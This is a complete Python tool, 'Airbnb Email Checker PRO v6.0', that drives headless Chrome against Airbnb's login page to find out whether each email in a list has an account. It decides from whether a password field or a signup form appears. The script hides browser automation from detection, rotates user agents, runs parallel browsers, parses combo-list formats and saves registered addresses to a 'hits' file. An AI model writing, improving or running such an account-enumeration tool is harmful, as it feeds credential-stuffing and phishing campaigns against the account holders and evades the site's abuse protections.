#!/usr/bin/env python3
"""
Airbnb Email Checker - PRO v6.0
- Page reuse (no reload per email = 3-5x faster)
- Multi-threaded (parallel browser instances)
- Auto-save results in real-time
- Resume support (skip already checked)
- ETA + live stats
- Retry on failure
"""
import time, sys, os, re, random, argparse, threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

if os.name == "nt": os.system("")

class C:
    G="\033[92m"; R="\033[91m"; Y="\033[93m"; CY="\033[96m"
    W="\033[97m"; GR="\033[90m"; O="\033[38;5;208m"; M="\033[95m"
    B="\033[1m"; RS="\033[0m"

BANNER = rf"""
{C.CY}{C.B}
       _    ___ ____  ____  _   _ ____  
      / \  |_ _|  _ \| __ )| \ | | __ ) 
     / _ \  | || |_) |  _ \|  \| |  _ \ 
    / ___ \ | ||  _ <| |_) | |\  | |_) |
   /_/   \_\___|_| \_\____/|_| \_|____/ 
        PRO v6.0 - Multi-Thread / Fast
{C.RS}"""

# ═══════════════════════════════════════════════════════════════
#  BROWSER SETUP
# ═══════════════════════════════════════════════════════════════
def make_driver(headless=True):
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from webdriver_manager.chrome import ChromeDriverManager
    opts = Options()
    if headless: opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--disable-extensions")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--disable-images")
    opts.add_argument("--blink-settings=imagesEnabled=false")
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    ])
    opts.add_argument(f"user-agent={ua}")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.add_experimental_option("useAutomationExtension", False)
    opts.page_load_strategy = "eager"
    svc = Service(ChromeDriverManager().install())
    d = webdriver.Chrome(service=svc, options=opts)
    d.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    d.set_page_load_timeout(20)
    d.implicitly_wait(3)
    return d


# ═══════════════════════════════════════════════════════════════
#  CHECKER WORKER
# ═══════════════════════════════════════════════════════════════
class AirbnbWorker:
    """One browser instance that checks emails."""

    def __init__(self, worker_id, headless=True):
        self.id = worker_id
        self.driver = make_driver(headless)
        self.on_login_page = False
        self.checks = 0

    def _goto_login(self):
        """Navigate to login page and click 'Continue with email'."""
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC

        self.driver.get("https://www.airbnb.com/login")
        time.sleep(random.uniform(3, 5))

        # Click "Continue with email"
        for sel in [
            "//button[contains(text(),'Continue with email')]",
            "//button[contains(text(),'email')]",
            "//*[@data-testid='social-auth-button-email']",
        ]:
            try:
                btn = self.driver.find_element(By.XPATH, sel)
                if btn.is_displayed():
                    self.driver.execute_script("arguments[0].click();", btn)
                    time.sleep(random.uniform(2, 3))
                    break
            except: continue

        # Also try CSS buttons with "email" text
        try:
            for btn in self.driver.find_elements(By.CSS_SELECTOR, "button"):
                if "email" in btn.text.lower() and btn.is_displayed():
                    self.driver.execute_script("arguments[0].click();", btn)
                    time.sleep(2)
                    break
        except: pass

        self.on_login_page = True

    def _find_email_input(self):
        """Find the email input field."""
        from selenium.webdriver.common.by import By
        for sel in ["input[type='email']", "input[name='email']",
                     "input#email-login-email", "input[data-testid*='email']",
                     "input[autocomplete='username']", "input[inputmode='email']"]:
            try:
                el = self.driver.find_element(By.CSS_SELECTOR, sel)
                if el.is_displayed(): return el
            except: continue
        # Fallback: any visible input
        for inp in self.driver.find_elements(By.TAG_NAME, "input"):
            t = (inp.get_attribute("type") or "").lower()
            p = (inp.get_attribute("placeholder") or "").lower()
            if inp.is_displayed() and (t in ("email","text") or "email" in p or "mail" in p):
                return inp
        return None

    def check(self, email, retries=2):
        """Check single email. Returns (email, registered, confidence, detail)."""
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys

        for attempt in range(retries + 1):
            try:
                # Go to login page if needed (first time or after error)
                if not self.on_login_page or self.checks % 20 == 0:
                    self._goto_login()

                self.checks += 1

                # Find email input
                ei = self._find_email_input()
                if not ei:
                    self._goto_login()
                    ei = self._find_email_input()
                if not ei:
                    return email, False, "ERROR", "No input found"

                # Clear and type email FAST
                ei.click()
                time.sleep(0.2)
                self.driver.execute_script("arguments[0].value = '';", ei)
                ei.clear()
                time.sleep(0.1)
                # Type with JS for speed, then add last char normally to trigger events
                if len(email) > 1:
                    self.driver.execute_script(
                        "arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', {bubbles: true}));",
                        ei, email[:-1])
                    time.sleep(0.1)
                ei.send_keys(email[-1] if len(email) > 1 else email)
                time.sleep(0.3)

                # Click Continue
                clicked = False
                for sel in ["button[type='submit']", "button[data-testid='signup-login-submit-btn']"]:
                    try:
                        btn = self.driver.find_element(By.CSS_SELECTOR, sel)
                        if btn.is_displayed():
                            self.driver.execute_script("arguments[0].click();", btn)
                            clicked = True; break
                    except: continue
                if not clicked:
                    try:
                        btn = self.driver.find_element(By.XPATH,
                            "//button[@type='submit' or contains(text(),'Continue')]")
                        self.driver.execute_script("arguments[0].click();", btn)
                    except:
                        ei.send_keys(Keys.RETURN)

                # Wait for response
                time.sleep(random.uniform(3, 5))

                body = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                src = self.driver.page_source.lower()

                # PASSWORD FIELD = REGISTERED
                try:
                    pfs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
                    if any(p.is_displayed() for p in pfs):
                        # Go back to email step for next check
                        self.driver.back()
                        time.sleep(1)
                        return email, True, "HIGH", "Password field -> REGISTERED"
                except: pass

                # SIGNUP PAGE = NOT REGISTERED
                for p in ["finish signing up", "sign up", "first name", "last name",
                          "birthday", "create account", "join airbnb", "create your account"]:
                    if p in body or p in src:
                        self.driver.back()
                        time.sleep(1)
                        return email, False, "HIGH", f"Signup page ({p})"

                # URL check
                if "signup" in self.driver.current_url.lower():
                    self.driver.back(); time.sleep(1)
                    return email, False, "HIGH", "Redirected to signup"

                # Password text indicators
                for p in ["enter your password", "welcome back", "forgot password"]:
                    if p in body:
                        self.driver.back(); time.sleep(1)
                        return email, True, "MEDIUM", f"Password prompt ({p})"

                # Not found indicators
                for p in ["no account", "not found", "doesn't exist", "we don't recognize"]:
                    if p in body:
                        self.driver.back(); time.sleep(1)
                        return email, False, "HIGH", f"Not found ({p})"

                # Rate limit
                for p in ["too many", "captcha", "verify", "try again"]:
                    if p in body:
                        self.on_login_page = False
                        time.sleep(10)
                        return email, None, "RATE_LIMITED", f"Rate limited ({p})"

                # Unknown - go back and retry
                self.driver.back(); time.sleep(1)
                if attempt < retries:
                    self.on_login_page = False
                    continue
                return email, None, "LOW", "Unclear response"

            except Exception as e:
                self.on_login_page = False
                if attempt < retries:
                    time.sleep(3)
                    continue
                return email, None, "ERROR", str(e)[:50]

    def quit(self):
        try: self.driver.quit()
        except: pass


# ═══════════════════════════════════════════════════════════════
#  FILE I/O
# ═══════════════════════════════════════════════════════════════
def load_emails(fp):
    if not os.path.exists(fp):
        print(f"  {C.R}[!] Not found: {fp}{C.RS}"); sys.exit(1)
    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
        raw = [l.strip() for l in f if l.strip()]
    emails, skip = [], 0
    for ln in raw:
        e = ln.split(":")[0].split(";")[0].split("|")[0].strip()
        if re.match(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$", e):
            emails.append(e.lower())
        else: skip += 1
    if skip: print(f"  {C.Y}[!] Skipped {skip} invalid{C.RS}")
    seen = set()
    return [e for e in emails if e not in seen and not seen.add(e)]

def load_already_checked(out):
    """Load already checked emails from results file (for resume)."""
    done = set()
    if os.path.exists(out):
        with open(out, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                m = re.match(r"\s*\[.\]\s+(\S+@\S+)", line)
                if m: done.add(m.group(1).lower())
    return done

lock = threading.Lock()
results_list = []
reg_count = 0
checked_count = 0

def save_result(email, registered, confidence, detail, out_file):
    """Thread-safe result saving."""
    global reg_count, checked_count
    with lock:
        tag = "[+]" if registered else "[-]"
        with open(out_file, "a", encoding="utf-8") as f:
            f.write(f"  {tag} {email:<40} [{confidence}] {detail}\n")
        if registered:
            hits_file = out_file.replace(".txt", "_hits.txt")
            with open(hits_file, "a", encoding="utf-8") as f:
                f.write(f"{email}\n")
            reg_count += 1
        checked_count += 1
        results_list.append({"email": email, "registered": registered, "confidence": confidence})


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
def p_line(): print(f"{C.GR}{'='*65}{C.RS}")

def main():
    global reg_count, checked_count
    pa = argparse.ArgumentParser()
    pa.add_argument("-f","--file"); pa.add_argument("-e","--email")
    pa.add_argument("-o","--output", default="airbnb_results.txt")
    pa.add_argument("-d","--delay", type=float, default=2.0)
    pa.add_argument("-t","--threads", type=int, default=1, help="Parallel browsers (1-4)")
    pa.add_argument("--resume", action="store_true", help="Skip already checked emails")
    pa.add_argument("--show-browser", action="store_true")
    a = pa.parse_args()

    print(BANNER)

    # Load emails
    emails = []
    if a.email: emails = [a.email.lower()]
    elif a.file: emails = load_emails(a.file)
    else:
        print(f"  {C.Y}1-File  2-Manual  3-Single{C.RS}")
        ch = input(f"  {C.CY}>>> {C.RS}").strip()
        if ch=="1":
            fp = input(f"  {C.CY}File (emails.txt): {C.RS}").strip() or "emails.txt"
            emails = load_emails(fp)
        elif ch=="2":
            print("  Enter emails, 'done' to finish:")
            while True:
                e = input("  > ").strip()
                if e.lower()=="done": break
                if "@" in e: emails.append(e.lower())
        elif ch=="3":
            e = input(f"  {C.CY}Email: {C.RS}").strip()
            if "@" in e: emails=[e.lower()]
    if not emails: print(f"  {C.R}No emails.{C.RS}"); sys.exit(1)

    # Resume: skip already checked
    if a.resume:
        done = load_already_checked(a.output)
        before = len(emails)
        emails = [e for e in emails if e not in done]
        print(f"  {C.Y}[*] Resume: {before - len(emails)} already checked, {len(emails)} remaining{C.RS}")
    else:
        # Clear output files
        for f in [a.output, a.output.replace(".txt","_hits.txt")]:
            if os.path.exists(f): os.remove(f)
        with open(a.output, "w", encoding="utf-8") as f:
            f.write(f"  AIRBNB CHECKER RESULTS - {datetime.now():%Y-%m-%d %H:%M:%S}\n{'='*65}\n\n")

    if not emails: print(f"  {C.G}All emails already checked!{C.RS}"); sys.exit(0)

    threads = min(a.threads, 4, len(emails))
    print(f"  {C.CY}[*] {len(emails)} emails | {threads} thread(s) | delay {a.delay}s{C.RS}")
    print()
    p_line()
    print(f"  {C.B}{C.W}AIRBNB CHECK - STARTING{C.RS}")
    p_line()
    print()

    # Create workers
    print(f"  {C.CY}[*] Starting {threads} browser(s)...{C.RS}")
    workers = []
    for i in range(threads):
        w = AirbnbWorker(i, headless=not a.show_browser)
        workers.append(w)
        print(f"  {C.G}[+] Browser #{i+1} ready{C.RS}")
    print()

    t0 = time.time()
    total = len(emails)

    try:
        if threads == 1:
            # Single thread mode
            w = workers[0]
            for i, email in enumerate(emails):
                result = w.check(email)
                _, registered, confidence, detail = result
                is_reg = registered is True

                save_result(email, is_reg, confidence, detail, a.output)

                # Display
                elapsed = time.time() - t0
                speed = checked_count / elapsed if elapsed > 0 else 0
                eta = (total - checked_count) / speed if speed > 0 else 0
                eta_str = str(timedelta(seconds=int(eta)))

                cc = {True: C.G, False: C.R}.get(is_reg, C.GR)
                tag = f"{C.G}[+] HIT " if is_reg else f"{C.R}[-] MISS"
                pct = checked_count / total * 100
                print(f"  {tag}{C.RS} {C.W}{email:<35}{C.RS} {cc}[{confidence}]{C.RS} {C.GR}| {checked_count}/{total} ({pct:.0f}%) | ETA: {eta_str} | Hits: {reg_count}{C.RS}")

                if i < len(emails) - 1:
                    time.sleep(a.delay + random.uniform(0, 1))
        else:
            # Multi-thread mode
            email_chunks = [[] for _ in range(threads)]
            for i, e in enumerate(emails):
                email_chunks[i % threads].append(e)

            def worker_run(worker, chunk):
                for email in chunk:
                    result = worker.check(email)
                    _, registered, confidence, detail = result
                    is_reg = registered is True
                    save_result(email, is_reg, confidence, detail, a.output)

                    elapsed = time.time() - t0
                    speed = checked_count / elapsed if elapsed > 0 else 0
                    eta = (total - checked_count) / speed if speed > 0 else 0
                    eta_str = str(timedelta(seconds=int(eta)))

                    cc = {True: C.G, False: C.R}.get(is_reg, C.GR)
                    tag = f"{C.G}[+] HIT " if is_reg else f"{C.R}[-] MISS"
                    pct = checked_count / total * 100

                    with lock:
                        print(f"  {tag}{C.RS} {C.W}{email:<35}{C.RS} {cc}[{confidence}]{C.RS} {C.GR}| {checked_count}/{total} ({pct:.0f}%) | ETA: {eta_str} | Hits: {reg_count}{C.RS}")

                    time.sleep(a.delay + random.uniform(0, 1))

            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = []
                for i in range(threads):
                    futures.append(ex.submit(worker_run, workers[i], email_chunks[i]))
                for f in as_completed(futures):
                    f.result()

    except KeyboardInterrupt:
        print(f"\n\n  {C.Y}[!] Stopped! Results saved.{C.RS}")
    finally:
        for w in workers: w.quit()

    elapsed = time.time() - t0

    # Summary
    print()
    p_line()
    print(f"  {C.B}{C.W}SUMMARY{C.RS}")
    p_line()
    print(f"  {C.W}Total    :{C.RS} {checked_count}")
    print(f"  {C.G}Hits     :{C.RS} {reg_count}")
    print(f"  {C.R}Misses   :{C.RS} {checked_count - reg_count}")
    if checked_count:
        print(f"  {C.Y}Hit Rate :{C.RS} {reg_count/checked_count*100:.1f}%")
        print(f"  {C.CY}Speed    :{C.RS} {checked_count/elapsed*60:.1f} emails/min")
    print(f"  {C.GR}Time     :{C.RS} {timedelta(seconds=int(elapsed))}")
    p_line()
    print(f"\n  {C.G}Results  : {a.output}{C.RS}")
    print(f"  {C.G}Hits file: {a.output.replace('.txt','_hits.txt')}{C.RS}")
    print(f"\n  {C.CY}Done!{C.RS}\n")

if __name__ == "__main__": main()
